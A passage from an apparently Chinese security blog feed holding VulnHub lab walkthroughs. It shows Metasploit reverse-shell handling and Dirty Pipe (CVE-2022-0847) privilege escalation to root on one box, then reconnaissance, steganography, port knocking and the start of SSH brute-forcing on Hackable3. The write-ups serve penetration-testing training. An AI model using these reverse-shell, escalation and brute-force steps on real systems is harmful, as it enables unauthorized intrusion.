class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt;  use exploit/multi/handler <br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br>payload =&gt; php/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lhost 0.0.0.0<br>lhost =&gt; 0.0.0.0<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport 4444<br>lport =&gt; 4444<br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[*] Sending stage (39927 bytes) to 192.168.1.6<br>[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.6:47686) at 2025-02-10 16:26:51 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><h1 id="提权-dirtypipe"><a href="#提权-dirtypipe" class="headerlink" title="提权-dirtypipe"></a>提权-dirtypipe</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，将脚本上传至临时目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/matrix-breakout-2-morpheus/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/matrix-breakout-2-morpheus/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/matrix-breakout-2-morpheus/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; shell<br>Process 1105 created.<br>Channel 1 created.<br><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">chmod</span> +x 1.sh<br>./1.sh<br></code></pre></td></tr></table></figure><p>（2）寻找到可能存在的漏洞利用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101630578.png"><br>（3）寻找可利用的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; background <br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; search dirtypipe<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                         Disclosure Date  Rank       Check  Description</span><br>   -  ----                                         ---------------  ----       -----  -----------<br>   0  exploit/linux/local/cve_2022_0847_dirtypipe  2022-02-20       excellent  Yes    Dirty Pipe Local Privilege Escalation via CVE-2022-0847<br><br><br>Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/cve_2022_0847_dirtypipe                               <br></code></pre></td></tr></table></figure><p>（4）使用该脚本进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; use exploit/linux/local/cve_2022_0847_dirtypipe <br>[*] Using configured payload linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; sessions<br><br>Active sessions<br>===============<br><br>  Id  Name  Type                   Information          Connection<br>  --  ----  ----                   -----------          ----------<br>  1         meterpreter php/linux  www-data @ morpheus  192.168.1.5:4444 -&gt; 192.168.1.6:47686 (192.<br>                                                        168.1.6)<br><br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; <span class="hljs-built_in">set</span> session 1<br>session =&gt; 1<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; run<br><br>[-] Msf::OptionValidateError One or more options failed to validate: LHOST.<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; <span class="hljs-built_in">set</span> lhost 0.0.0.0<br>lhost =&gt; 0.0.0.0<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; run<br><br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[!] SESSION may not be compatible with this module:<br>[!]  * incompatible session architecture: php<br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0<br>[*] Executing exploit <span class="hljs-string">&#x27;/tmp/.daigaaizfky /bin/passwd&#x27;</span><br>[*] Exploit completed, but no session was created.<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; <span class="hljs-built_in">set</span> lhost 192.168.1.5<br>lhost =&gt; 192.168.1.5<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.1.5:4444 <br>[!] SESSION may not be compatible with this module:<br>[!]  * incompatible session architecture: php<br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0<br>[*] Executing exploit <span class="hljs-string">&#x27;/tmp/.spwuydueg /bin/passwd&#x27;</span><br>[*] Sending stage (3045380 bytes) to 192.168.1.6<br>[+] Deleted /tmp/.spwuydueg<br>[*] Meterpreter session 2 opened (192.168.1.5:4444 -&gt; 192.168.1.6:47730) at 2025-02-10 16:35:44 +0800<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（5）成功提权到root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: root<br></code></pre></td></tr></table></figure><p><strong>查看flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 2917 created.<br>Channel 1 created.<br><span class="hljs-built_in">cat</span> /root/FLAG.txt<br>You<span class="hljs-string">&#x27;ve won!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let&#x27;</span>s hope Matrix: Resurrections rocks!<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）主要就是一个web逻辑的渗透<br>（2）提权msf一键梭哈</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逻辑漏洞</tag>
      
      <tag>提权-dirtypipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackable3</title>
    <link href="/vulnhub/Hackable3/"/>
    <url>/vulnhub/Hackable3/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/hackable-iii,720/">https://www.vulnhub.com/entry/hackable-iii,720/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00016s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00060s latency).<br>MAC Address: 08:00:27:ED:9E:57 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00072s latency).<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 1.93 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.13                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE    SERVICE<br>22/tcp filtered ssh<br>80/tcp open     http<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.00 seconds<br></code></pre></td></tr></table></figure><ul><li>发现只开放80端口，22端口处于被过滤状态<br>（2）端口细节扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.2.13 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00075s latency).<br><br>PORT   STATE  SERVICE VERSION<br>22/tcp closed ssh<br>80/tcp open   http    Apache httpd 2.4.46 ((Ubuntu))<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br><br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.33 seconds<br><br></code></pre></td></tr></table></figure>（3）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.2.13 -oA nmapscan/vuln <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00033s latency).<br><br>PORT   STATE    SERVICE<br>22/tcp filtered ssh<br>80/tcp open     http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.13</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.13:80/login_page/login.html</span><br><span class="hljs-string">|     Form id: ckb1</span><br><span class="hljs-string">|_    Form action: ../login.php</span><br><span class="hljs-string">| http-sql-injection: </span><br><span class="hljs-string">|   Possible sqli for queries:</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|   Possible sqli for forms:</span><br><span class="hljs-string">|     Form at path: /login_page/login.html, form&#x27;</span>s action: ../login.php. Fields that might be vulnerable:<br>|       user<br>|_      remember-me<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /login.php: Possible admin folder</span><br><span class="hljs-string">|   /home.html: Possible admin folder</span><br><span class="hljs-string">|   /backup/: Backup folder w/ directory listing</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /config/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.79 seconds</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，只是一个图片，查看页面源码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111649036.png"></p><ul><li>找到一个注释，提示，jubiscleudo，请不要忘记在离开你的部门时激活端口敲门，并告诉老板不要忘记批准，jpg文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Please, jubiscleudo, don<span class="hljs-string">&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com</span><br></code></pre></td></tr></table></figure>（2）进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.13<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 1095]<br>/home.html            (Status: 200) [Size: 11327]<br>/login.php            (Status: 200) [Size: 487]<br>/css                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.13/css/]<br>/js                   (Status: 301) [Size: 309] [--&gt; http://192.168.2.13/js/]<br>/config               (Status: 301) [Size: 313] [--&gt; http://192.168.2.13/config/]<br>/config.php           (Status: 200) [Size: 507]<br>/backup               (Status: 301) [Size: 313] [--&gt; http://192.168.2.13/backup/]<br>/robots.txt           (Status: 200) [Size: 33]<br>/imagens              (Status: 301) [Size: 314] [--&gt; http://192.168.2.13/imagens/]<br>/login_page           (Status: 301) [Size: 317] [--&gt; http://192.168.2.13/login_page/]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 882236 / 882240 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>（3）访问robot.txt，显示不允许访问<code>config</code>，尝试进行访问，发现是一个base64的编码<code>MTAwMDA=</code>，进行解码，解出来是<code>10000</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111727485.png"><br>（4）访问login.php，显示空白页面，查看页面源码，是一个PHP代码，里面有一个<code>3.jpg</code>，根据提示，尝试去读取图片中的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111731287.png"><br>（5）使用steghide去读取图片信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> wget http://192.168.2.13/3.jpg                                      <br>--2025-02-11 15:05:32--  http://192.168.2.13/3.jpg<br>正在连接 192.168.2.13:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：61259 (60K) [image/jpeg]<br>正在保存至: “3.jpg”<br><br>3.jpg                         100%[==============================================&gt;]  59.82K  --.-KB/s  用时 0s      <br><br>2025-02-11 15:05:32 (819 MB/s) - 已保存 “3.jpg” [61259/61259])<br>┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ steghide info 3.jpg <br><span class="hljs-string">&quot;3.jpg&quot;</span>:<br>  format: jpeg<br>  capacity: 3.6 KB<br>Try to get information about embedded data ? (y/n) y<br>Enter passphrase: <br>  embedded file <span class="hljs-string">&quot;steganopayload148505.txt&quot;</span>:<br>    size: 12.0 Byte<br>    encrypted: rijndael-128, cbc<br>    compressed: <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure></li><li>找到图片里面有一个txt文件，进行提取，找到一个端口号<code>65535</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> steghide extract -sf 3.jpg<br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;steganopayload148505.txt&quot;</span>.<br>┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">cat</span> steganopayload148505.txt <br>porta:65535       <br></code></pre></td></tr></table></figure>（6）访问<code>/css</code>，在里面找到一个<code>2.txt</code>，查看发现是<code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;------------------....</code>，结果搜索，发现是<code>Brainfuck</code>加密，进行解密得到<code>4444</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111740037.png"><br>（7）访问<code>config.php</code>，发现页面是空白的，查看页面源码，是数据库连接的配置文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111742396.png"><br>（8）访问<code>/backup</code>，找到里面存在一个字典<code>wordlist.txt</code>，下载到本地<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111744008.png"><br>（9）访问<code>/imagens</code>，里面存在一些图片<br>（10）访问<code>/login_page</code>，里面找到一个<code>login.html</code>，进行访问，发现是一个登录页面，尝试进行登录，直接跳转至<code>login.php</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111747161.png"></li></ul><h1 id="敲击端口"><a href="#敲击端口" class="headerlink" title="敲击端口"></a>敲击端口</h1><p>（1）根据开始的提示和22端口处于关闭状态，需要进行敲击激活端口，收集到端口为<code>10000,4444,65535</code>，使用<code>knock</code>进行敲击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ knock -v 192.168.2.13 10000 4444 65535<br>hitting tcp 192.168.2.13:10000<br>hitting tcp 192.168.2.13:4444<br>hitting tcp 192.168.2.13:65535<br></code></pre></td></tr></table></figure><p>（2）再次进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.13                                   <br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 15:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00015s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.33 seconds<br></code></pre></td></tr></table></figure><ul><li>发现22端口已经开放</li></ul><h1 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h1><p>（1）根据收集到的信息，尝试进行ssh爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 